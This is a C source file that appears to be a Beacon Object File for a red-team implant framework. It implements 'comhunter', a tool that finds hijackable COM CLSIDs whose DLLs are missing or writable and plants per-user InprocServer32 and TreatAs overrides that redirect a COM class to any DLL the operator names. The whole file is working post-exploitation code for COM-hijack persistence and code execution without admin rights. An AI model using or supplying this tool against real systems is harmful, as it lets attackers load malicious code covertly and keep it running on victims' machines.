/*
 * comhunter <find|list|add|remove|treatas> [args]
 *
 * COM hijack discovery and user-hive overrides.
 *   find [substr]        - report CLSIDs whose InprocServer32 is missing or
 *                          writable (optional substring filter on the GUID)
 *   list <clsid>         - dump InprocServer32 / LocalServer32 / TreatAs
 *   add <clsid> <dll>    - create HKCU CLSID override (InprocServer32=Both)
 *   remove <clsid>       - delete the HKCU CLSID override
 *   treatas <clsid> <server-clsid> - set up a TreatAs redirect
 *
 * Only the per-user hive is modified, so no admin rights are required and
 * the change is easy to roll back.  `find` results are heuristics: a
 * writable or missing DLL is a candidate, not proof of a vulnerability.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define KEY_WOW64_64 0x0100

static void guid_braces(const char *in, char *out, int outsz)
{
    int n = bof_strlen(in);
    if (n > 2 && in[0] == '{' && in[n - 1] == '}') {
        bof_strncpy(out, in, outsz);
        return;
    }
    if (outsz < n + 3) { bof_strncpy(out, in, outsz); return; }
    out[0] = '{';
    bof_strncpy(out + 1, in, outsz - 2);
    bof_strncat(out, "}", outsz - bof_strlen(out) - 1);
}

static int reg_get_sz(HKEY root, const char *sub, const char *val,
                      char *out, int outsz)
{
    HKEY h;
    DWORD size = outsz, type = 0;
    LONG rc;

    out[0] = 0;
    rc = ADVAPI32$RegOpenKeyExA(root, sub, 0, KEY_READ | KEY_WOW64_64, &h);
    if (rc != ERROR_SUCCESS) return -1;
    rc = ADVAPI32$RegQueryValueExA(h, val, NULL, &type, (LPBYTE)out, &size);
    ADVAPI32$RegCloseKey(h);
    if (rc != ERROR_SUCCESS) { out[0] = 0; return -1; }
    if (type == REG_SZ || type == REG_EXPAND_SZ) {
        if (size) out[size - 1] = 0;
    } else {
        out[0] = 0;
        return -1;
    }
    return 0;
}

static int reg_set_sz(HKEY root, const char *sub, const char *val,
                      const char *data)
{
    HKEY h;
    DWORD disp = 0;
    LONG rc;

    rc = ADVAPI32$RegCreateKeyExA(root, sub, 0, NULL, 0,
                                  KEY_WRITE | KEY_WOW64_64, NULL, &h, &disp);
    if (rc != ERROR_SUCCESS) return -1;
    rc = ADVAPI32$RegSetValueExA(h, val, 0, REG_SZ, (const BYTE *)data,
                                 (DWORD)(bof_strlen(data) + 1));
    ADVAPI32$RegCloseKey(h);
    return rc == ERROR_SUCCESS ? 0 : -1;
}

/* 0 = usable, 1 = missing, 2 = writable by us, 3 = both unknown */
static int dll_state(const char *dll, char *why, int whysz)
{
    DWORD attr;
    HANDLE f;

    why[0] = 0;
    if (!dll[0]) { bof_strncpy(why, "no path", whysz); return 3; }

    attr = KERNEL32$GetFileAttributesA(dll);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        bof_strncpy(why, "MISSING", whysz);
        return 1;
    }

    f = KERNEL32$CreateFileA(dll, GENERIC_WRITE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                             OPEN_EXISTING, 0, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(f);
        bof_strncpy(why, "WRITABLE", whysz);
        return 2;
    }
    return 0;
}

static int scan_hive(HKEY root, const char *label, const char *filter,
                     int *scanned)
{
    HKEY classes;
    DWORD index;
    char guid[128];
    int hits = 0;

    if (ADVAPI32$RegOpenKeyExA(root, "Software\\Classes\\CLSID", 0,
                               KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64,
                               &classes) != ERROR_SUCCESS)
        return 0;

    for (index = 0; ; index++) {
        DWORD glen = sizeof(guid);
        char sub[256], dll[1024], why[32], full[1200];
        int state;

        if (ADVAPI32$RegEnumKeyExA(classes, index, guid, &glen, NULL, NULL,
                                   NULL, NULL) != ERROR_SUCCESS)
            break;
        (*scanned)++;

        if (filter && filter[0] && !bof_strstr(guid, filter))
            continue;

        bof_strcpy(sub, guid);
        bof_strcat(sub, "\\InprocServer32");
        if (reg_get_sz(root, sub, NULL, dll, sizeof(dll)) != 0)
            continue;

        state = dll_state(dll, why, sizeof(why));
        if (state != 1 && state != 2)
            continue;

        bof_strcpy(full, label);
        bof_strcat(full, "\\");
        bof_strcat(full, guid);
        BeaconPrintf(CALLBACK_OUTPUT, "%-72s %-8s %s\n", full, why, dll);
        hits++;
        if (hits >= 250) {
            BeaconPrintf(CALLBACK_OUTPUT, "  ... output truncated\n");
            break;
        }
    }

    ADVAPI32$RegCloseKey(classes);
    return hits;
}

static void do_find(const char *filter)
{
    int scanned = 0, hits = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "%-72s %-8s %s\n", "CLSID", "STATE", "DLL");
    hits += scan_hive(HKEY_LOCAL_MACHINE, "HKLM", filter, &scanned);
    hits += scan_hive(HKEY_CURRENT_USER,  "HKCU", filter, &scanned);
    BeaconPrintf(CALLBACK_OUTPUT, "\nCandidates: %d of %d CLSID(s)\n", hits, scanned);
}

static void print_value(HKEY root, const char *sub, const char *val)
{
    char data[1024];
    if (reg_get_sz(root, sub, val, data, sizeof(data)) == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "  %-16s %s\n", val, data);
}

static void do_list(const char *clsid)
{
    char g[128], sub[512];
    int found = 0;

    guid_braces(clsid, g, sizeof(g));
    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);

    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", g);
    print_value(HKEY_CURRENT_USER, sub, NULL);
    print_value(HKEY_LOCAL_MACHINE, sub, NULL);

    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);
    bof_strcat(sub, "\\InprocServer32");
    BeaconPrintf(CALLBACK_OUTPUT, "InprocServer32\n");
    print_value(HKEY_CURRENT_USER, sub, NULL);
    print_value(HKEY_LOCAL_MACHINE, sub, NULL);
    print_value(HKEY_CURRENT_USER, sub, "ThreadingModel");
    print_value(HKEY_LOCAL_MACHINE, sub, "ThreadingModel");
    found = 1;

    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);
    bof_strcat(sub, "\\LocalServer32");
    BeaconPrintf(CALLBACK_OUTPUT, "LocalServer32\n");
    print_value(HKEY_CURRENT_USER, sub, NULL);
    print_value(HKEY_LOCAL_MACHINE, sub, NULL);

    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);
    bof_strcat(sub, "\\TreatAs");
    BeaconPrintf(CALLBACK_OUTPUT, "TreatAs\n");
    print_value(HKEY_CURRENT_USER, sub, NULL);
    print_value(HKEY_LOCAL_MACHINE, sub, NULL);

    if (!found)
        BeaconPrintf(CALLBACK_OUTPUT, "(no override in either hive)\n");
}

static void do_add(const char *clsid, const char *dll)
{
    char g[128], sub[512];

    if (!clsid || !clsid[0] || !dll || !dll[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: comhunter add <clsid> <dll>\n");
        return;
    }

    guid_braces(clsid, g, sizeof(g));
    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);
    bof_strcat(sub, "\\InprocServer32");

    if (reg_set_sz(HKEY_CURRENT_USER, sub, NULL, dll) != 0 ||
        reg_set_sz(HKEY_CURRENT_USER, sub, "ThreadingModel", "Both") != 0) {
        BeaconPrintf(CALLBACK_ERROR, "failed to write HKCU override\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Added HKCU\\%s -> %s\n", sub, dll);
}

static void do_remove(const char *clsid)
{
    char g[128], sub[512];

    if (!clsid || !clsid[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: comhunter remove <clsid>\n");
        return;
    }

    guid_braces(clsid, g, sizeof(g));
    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);

    if (ADVAPI32$RegDeleteTreeA(HKEY_CURRENT_USER, sub) == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "Removed HKCU\\%s\n", sub);
    else
        BeaconPrintf(CALLBACK_ERROR, "no HKCU key at %s\n", sub);
}

static void do_treatas(const char *clsid, const char *server)
{
    char g[128], s[128], sub[512];

    if (!clsid || !clsid[0] || !server || !server[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: comhunter treatas <clsid> <server-clsid>\n");
        return;
    }

    guid_braces(clsid, g, sizeof(g));
    guid_braces(server, s, sizeof(s));
    bof_strcpy(sub, "Software\\Classes\\CLSID\\");
    bof_strcat(sub, g);
    bof_strcat(sub, "\\TreatAs");

    if (reg_set_sz(HKEY_CURRENT_USER, sub, NULL, s) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "failed to write TreatAs\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "TreatAs %s -> %s\n", g, s);
}

void go(char *args, int alen)
{
    datap parser;
    char *op = "", *a = "", *b = "";
    char opbuf[32], abuf[256], bbuf[256];
    int len;

    if (args && alen > 0) {
        BeaconDataParse(&parser, args, alen);
        op = BeaconDataExtract(&parser, &len);
        if (op) bof_strncpy(opbuf, op, sizeof(opbuf)); else opbuf[0] = 0;
        a = BeaconDataExtract(&parser, &len);
        if (a) bof_strncpy(abuf, a, sizeof(abuf)); else abuf[0] = 0;
        b = BeaconDataExtract(&parser, &len);
        if (b) bof_strncpy(bbuf, b, sizeof(bbuf)); else bbuf[0] = 0;
        op = opbuf; a = abuf; b = bbuf;
    }

    if (!op[0] || bof_stricmp(op, "find") == 0) {
        do_find(a);
    } else if (bof_stricmp(op, "list") == 0) {
        do_list(a);
    } else if (bof_stricmp(op, "add") == 0) {
        do_add(a, b);
    } else if (bof_stricmp(op, "remove") == 0 || bof_stricmp(op, "del") == 0) {
        do_remove(a);
    } else if (bof_stricmp(op, "treatas") == 0) {
        do_treatas(a, b);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: comhunter <find|list|add|remove|treatas> [args]\n");
    }
}
